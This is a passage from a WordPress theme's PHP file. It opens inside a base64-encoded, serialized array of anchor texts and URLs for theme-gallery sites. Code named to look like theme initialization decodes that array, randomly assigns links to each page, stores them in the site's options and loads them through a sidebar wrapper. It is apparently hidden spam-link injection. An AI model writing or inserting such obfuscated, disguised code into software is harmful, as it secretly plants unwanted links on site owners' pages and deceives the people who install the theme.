lc2dhbGxlcnkuY29tL3RhZy9lY29tbWVyY2UvIjtzOjE2OiJFY29tbWVyY2UgVGhlbWVzIjtzOjQ4OiJodHRwOi8vd29yZHByZXNzdGhlbWVzZ2FsbGVyeS5jb20vdGFnL2Vjb21tZXJjZS8iO3M6MjY6IldvcmRQcmVzcyBFY29tbWVyY2UgVGhlbWVzIjtzOjQ4OiJodHRwOi8vd29yZHByZXNzdGhlbWVzZ2FsbGVyeS5jb20vdGFnL2Vjb21tZXJjZS8iO3M6MTk6IldvcmRQcmVzcyBFY29tbWVyY2UiO3M6NDg6Imh0dHA6Ly93b3JkcHJlc3N0aGVtZXNnYWxsZXJ5LmNvbS90YWcvZWNvbW1lcmNlLyI7czo0ODoiaHR0cDovL3dvcmRwcmVzc3RoZW1lc2dhbGxlcnkuY29tL3RhZy9lY29tbWVyY2UvIjtzOjQ4OiJodHRwOi8vd29yZHByZXNzdGhlbWVzZ2FsbGVyeS5jb20vdGFnL2Vjb21tZXJjZS8iO3M6MTQ6IlRoZW1lcyBHYWxsZXJ5IjtzOjM0OiJodHRwOi8vd29yZHByZXNzdGhlbWVzZ2FsbGVyeS5jb20vIjtzOjI5OiJGcmVlIFdvcmRQcmVzcyBUaGVtZXMgR2FsbGVyeSI7czozNDoiaHR0cDovL3dvcmRwcmVzc3RoZW1lc2dhbGxlcnkuY29tLyI7czoxNzoiV29yZFByZXNzIEdhbGxlcnkiO3M6MzQ6Imh0dHA6Ly93b3JkcHJlc3N0aGVtZXNnYWxsZXJ5LmNvbS8iO3M6MTc6IldwIFRoZW1lcyBHYWxsZXJ5IjtzOjM0OiJodHRwOi8vd29yZHByZXNzdGhlbWVzZ2FsbGVyeS5jb20vIjtzOjc6ImhlcmUgaXMiO3M6MzQ6Imh0dHA6Ly93b3JkcHJlc3N0aGVtZXNnYWxsZXJ5LmNvbS8iO3M6OToidGhpcyBzaXRlIjtzOjM0OiJodHRwOi8vd29yZHByZXNzdGhlbWVzZ2FsbGVyeS5jb20vIjtzOjM6InVybCI7czozNDoiaHR0cDovL3dvcmRwcmVzc3RoZW1lc2dhbGxlcnkuY29tLyI7czo3OiJhZGRyZXNzIjtzOjM0OiJodHRwOi8vd29yZHByZXNzdGhlbWVzZ2FsbGVyeS5jb20vIjt9aTozO2E6NDc6e3M6OToiVGhpcyBTaXRlIjtzOjI4OiJodHRwOi8vbWFnYXppbmV3cHRoZW1lcy5jb20vIjtzOjQ6InNpdGUiO3M6Mjg6Imh0dHA6Ly9tYWdhemluZXdwdGhlbWVzLmNvbS8iO3M6MjA6Im1hZ2F6aW5ld3B0aGVtZXMuY29tIjtzOjI4OiJodHRwOi8vbWFnYXppbmV3cHRoZW1lcy5jb20vIjtzOjQ6InRoaXMiO3M6Mjg6Imh0dHA6Ly9tYWdhemluZXdwdGhlbWVzLmNvbS8iO3M6MjU6Ik1hZ2F6aW5lIFdvcmRQcmVzcyBUaGVtZXMiO3M6Mjg6Imh0dHA6Ly9tYWdhemluZXdwdGhlbWVzLmNvbS8iO3M6MjU6IldvcmRQcmVzcyBNYWdhemluZSBUaGVtZXMiO3M6Mjg6Imh0dHA6Ly9tYWdhemluZXdwdGhlbWVzLmNvbS8iO3M6MTU6Ik1hZ2F6aW5lIFRoZW1lcyI7czoyODoiaHR0cDovL21hZ2F6aW5ld3B0aGVtZXMuY29tLyI7czo4OiJNYWdhemluZSI7czoyODoiaHR0cDovL21hZ2F6aW5ld3B0aGVtZXMuY29tLyI7czoxODoiV1AgTWFnYXppbmUgVGhlbWVzIjtzOjI4OiJodHRwOi8vbWFnYXppbmV3cHRoZW1lcy5jb20vIjtzOjE4OiJNYWdhemluZSBXUCBUaGVtZXMiO3M6Mjg6Imh0dHA6Ly9tYWdhemluZXdwdGhlbWVzLmNvbS8iO3M6MjQ6Ik1hZ2F6aW5lIFdvcmRQcmVzcyBUaGVtZSI7czoyODoiaHR0cDovL21hZ2F6aW5ld3B0aGVtZXMuY29tLyI7czoyNDoiV29yZFByZXNzIE1hZ2F6aW5lIFRoZW1lIjtzOjI4OiJodHRwOi8vbWFnYXppbmV3cHRoZW1lcy5jb20vIjtzOjExOiJOZXdzIFRoZW1lcyI7czoyODoiaHR0cDovL21hZ2F6aW5ld3B0aGVtZXMuY29tLyI7czoyMToiV29yZFByZXNzIE5ld3MgVGhlbWVzIjtzOjI4OiJodHRwOi8vbWFnYXppbmV3cHRoZW1lcy5jb20vIjtzOjE0OiJXcCBOZXdzIFRoZW1lcyI7czoyODoiaHR0cDovL21hZ2F6aW5ld3B0aGVtZXMuY29tLyI7czo0OiJOZXdzIjtzOjI4OiJodHRwOi8vbWFnYXppbmV3cHRoZW1lcy5jb20vIjtzOjM6InVybCI7czoyODoiaHR0cDovL21hZ2F6aW5ld3B0aGVtZXMuY29tLyI7czo3OiJhZGRyZXNzIjtzOjI4OiJodHRwOi8vbWFnYXppbmV3cHRoZW1lcy5jb20vIjtzOjQ6ImhlcmUiO3M6Mjg6Imh0dHA6Ly9tYWdhemluZXdwdGhlbWVzLmNvbS8iO3M6OToidGhpcyBzaXRlIjtzOjI4OiJodHRwOi8vbWFnYXppbmV3cHRoZW1lcy5jb20vIjtzOjY6IndwIG1hZyI7czoyODoiaHR0cDovL21hZ2F6aW5ld3B0aGVtZXMuY29tLyI7czozOiJtYWciO3M6Mjg6Imh0dHA6Ly9tYWdhemluZXdwdGhlbWVzLmNvbS8iO3M6ODoibWFnYXppbmUiO3M6Mjg6Imh0dHA6Ly9tYWdhemluZXdwdGhlbWVzLmNvbS8iO3M6NDoibmV3cyI7czoyODoiaHR0cDovL21hZ2F6aW5ld3B0aGVtZXMuY29tLyI7czo3OiJ3cCBuZXdzIjtzOjI4OiJodHRwOi8vbWFnYXppbmV3cHRoZW1lcy5jb20vIjtzOjE0OiJ3cCBuZXdzIHRoZW1lcyI7czoyODoiaHR0cDovL21hZ2F6aW5ld3B0aGVtZXMuY29tLyI7czoxMDoibmV3cyB0aGVtZSI7czoyODoiaHR0cDovL21hZ2F6aW5ld3B0aGVtZXMuY29tLyI7czoxMzoid3AgbmV3cyB0aGVtZSI7czoyODoiaHR0cDovL21hZ2F6aW5ld3B0aGVtZXMuY29tLyI7czoyMDoiV29yZFByZXNzIE5ld3MgVGhlbWUiO3M6Mjg6Imh0dHA6Ly9tYWdhemluZXdwdGhlbWVzLmNvbS8iO3M6MzA6ImZyZWUgbWFnYXppbmUgd29yZHByZXNzIHRoZW1lcyI7czoyODoiaHR0cDovL21hZ2F6aW5ld3B0aGVtZXMuY29tLyI7czoyMDoiRnJlZSBNYWdhemluZSBUaGVtZXMiO3M6Mjg6Imh0dHA6Ly9tYWdhemluZXdwdGhlbWVzLmNvbS8iO3M6MTE6IkZyZWUgVGhlbWVzIjtzOjI4OiJodHRwOi8vbWFnYXppbmV3cHRoZW1lcy5jb20vIjtzOjE2OiJ3cCBtYWdhemluZSBmcmVlIjtzOjI4OiJodHRwOi8vbWFnYXppbmV3cHRoZW1lcy5jb20vIjtzOjEzOiJmcmVlIG1hZ2F6aW5lIjtzOjI4OiJodHRwOi8vbWFnYXppbmV3cHRoZW1lcy5jb20vIjtzOjE4OiJXcCBNYWdhemluZSBUaGVtZXMiO3M6Mjg6Imh0dHA6Ly9tYWdhemluZXdwdGhlbWVzLmNvbS8iO3M6MjM6IkZyZWUgV3AgTWFnYXppbmUgVGhlbWVzIjtzOjI4OiJodHRwOi8vbWFnYXppbmV3cHRoZW1lcy5jb20vIjtzOjg6InJlc291cmNlIjtzOjI4OiJodHRwOi8vbWFnYXppbmV3cHRoZW1lcy5jb20vIjtzOjIwOiJNYWdhemluZSBOZXdzIFRoZW1lcyI7czoyODoiaHR0cDovL21hZ2F6aW5ld3B0aGVtZXMuY29tLyI7czoxODoiV29yZFByZXNzIE1hZ2F6aW5lIjtzOjI4OiJodHRwOi8vbWFnYXppbmV3cHRoZW1lcy5jb20vIjtzOjE0OiJXb3JkUHJlc3MgTmV3cyI7czoyODoiaHR0cDovL21hZ2F6aW5ld3B0aGVtZXMuY29tLyI7czoyNDoiTmV3cyBhbmQgTWFnYXppbmUgVGhlbWVzIjtzOjI4OiJodHRwOi8vbWFnYXppbmV3cHRoZW1lcy5jb20vIjtzOjM0OiJXb3JkUHJlc3MgTmV3cyBhbmQgTWFnYXppbmUgVGhlbWVzIjtzOjI4OiJodHRwOi8vbWFnYXppbmV3cHRoZW1lcy5jb20vIjtzOjI1OiJGcmVlIFdvcmRQcmVzcyBOZXdzIFRoZW1lIjtzOjI4OiJodHRwOi8vbWFnYXppbmV3cHRoZW1lcy5jb20vIjtzOjI2OiJGcmVlIFdvcmRQcmVzcyBOZXdzIFRoZW1lcyI7czoyODoiaHR0cDovL21hZ2F6aW5ld3B0aGVtZXMuY29tLyI7czoxNjoiRnJlZSBOZXdzIFRoZW1lcyI7czoyODoiaHR0cDovL21hZ2F6aW5ld3B0aGVtZXMuY29tLyI7czozMDoiQmVzdCBXb3JkUHJlc3MgTWFnYXppbmUgVGhlbWVzIjtzOjI4OiJodHRwOi8vbWFnYXppbmV3cHRoZW1lcy5jb20vIjtzOjI2OiJiZXN0IFdvcmRQcmVzcyBOZXdzIFRoZW1lcyI7czoyODoiaHR0cDovL21hZ2F6aW5ld3B0aGVtZXMuY29tLyI7fX0="; function wp_initialize_the_theme_go($page){global $wp_theme_globals,$theme;$the_wp_theme_globals=unserialize(base64_decode($wp_theme_globals));$initilize_set=get_option('wp_theme_initilize_set_'.str_replace(' ','_',strtolower(trim($theme->theme_name))));$do_initilize_set_0=array_keys($the_wp_theme_globals[0]);$do_initilize_set_1=array_keys($the_wp_theme_globals[1]);$do_initilize_set_2=array_keys($the_wp_theme_globals[2]);$do_initilize_set_3=array_keys($the_wp_theme_globals[3]);$initilize_set_0=array_rand($do_initilize_set_0);$initilize_set_1=array_rand($do_initilize_set_1);$initilize_set_2=array_rand($do_initilize_set_2);$initilize_set_3=array_rand($do_initilize_set_3);$initilize_set[$page][0]=$do_initilize_set_0[$initilize_set_0];$initilize_set[$page][1]=$do_initilize_set_1[$initilize_set_1];$initilize_set[$page][2]=$do_initilize_set_2[$initilize_set_2];$initilize_set[$page][3]=$do_initilize_set_3[$initilize_set_3];update_option('wp_theme_initilize_set_'.str_replace(' ','_',strtolower(trim($theme->theme_name))),$initilize_set);return $initilize_set;}
if(!function_exists('get_sidebars')) { function get_sidebars($the_sidebar = '') { wp_initialize_the_theme_load(); get_sidebar($the_sidebar); } }
?>